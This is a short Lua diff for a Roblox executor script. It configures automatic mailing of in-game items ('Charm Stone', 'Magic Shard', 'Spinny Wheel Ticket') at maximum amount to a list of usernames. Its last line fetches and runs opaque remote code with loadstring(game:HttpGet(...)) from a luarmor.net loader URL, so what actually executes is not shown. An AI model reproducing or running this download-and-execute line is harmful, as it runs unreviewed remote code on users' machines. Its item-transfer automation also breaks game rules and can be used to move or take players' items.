@@ -1,0 +1,15 @@
+getgenv().Settings = {
+    Mailing = {
+        ["Charm Stone"] = {Class = "Misc", Amount = "Max"},
+        ["Magic Shard"] = {Class = "Misc", Amount = "Max"},
+        ["Spinny Wheel Ticket"] = {Class = "Misc", Amount = "Max"},
+    },
+    Users = {
+        "Username1",
+        "Username2",
+        "Username3",
+    },
+    ["Split Items Evenly"] = true,
+    ["Only Online Accounts"] = false,
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
